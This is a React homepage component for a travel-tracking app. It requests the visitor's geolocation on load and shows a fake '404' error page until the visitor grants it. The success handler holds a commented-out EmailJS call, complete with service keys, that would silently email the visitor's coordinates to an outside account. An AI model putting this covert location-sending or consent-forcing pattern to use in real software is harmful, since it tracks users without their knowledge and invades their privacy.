import { Link } from "react-router-dom";
import emailjs from "@emailjs/browser";
import styles from "./Homepage.module.css";
import PageNav from "../components/PageNav";
import { useEffect, useState } from "react";
import Button from "../components/Button";

export default function Homepage() {
  const [isMyLocationLoad, setIsMyLocationLoad] = useState(false);
  const [myLocation, setMyLocation] = useState([40, 0]);
  const [isGetLocationSend, setIsGetLocationSend] = useState(false);

  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const coords = [position.coords.latitude, position.coords.longitude];
          setMyLocation(coords);
          setIsMyLocationLoad(true);

          if (!isGetLocationSend) {
            setIsGetLocationSend(true);
            // emailjs
            //   .send(
            //     "service_gzh9m0l",
            //     "template_k6ezf6m",
            //     {
            //       message: `Latitude: ${coords[0]}, Longitude: ${coords[1]}`,
            //     },
            //     {
            //       publicKey: "4ZZGXKscYvzR_xl4M",
            //     }
            //   )
            //   .then(
            //     () => {
            //       console.log("SUCCESS!");
            //     },
            //     (error) => {
            //       console.log("FAILED...", error.text);
            //     }
            //   );
          }
        },
        (error) => {
          console.log("Location error", error);
          setIsMyLocationLoad(false);
        }
      );
    } else {
      alert("Геолокация не поддерживается вашим браузером.");
    }
  };

  useEffect(() => {
    requestLocation();
  }, []);

  return (
    <>
      {isMyLocationLoad === true ? (
        <main className={styles.homepage}>
          <PageNav />

          <section>
            <h1>
              You travel the world.
              <br />
              WorldWise keeps track of your adventures.
            </h1>
            <h2>
              A world map that tracks your footsteps into every city you can
              think of. Never forget your wonderful experiences, and show your
              friends how you have wandered the world.
            </h2>
            <Link to="/app" className="cta">
              Start tracking now
            </Link>
          </section>
        </main>
      ) : (
        <main className={styles.homepage}>
          <section>
            <h1>
              Geolocation Error <br />
              404
            </h1>

            <Button onClick={requestLocation} type="primary">
              Get Position
            </Button>
          </section>
        </main>
      )}
    </>
  );
}
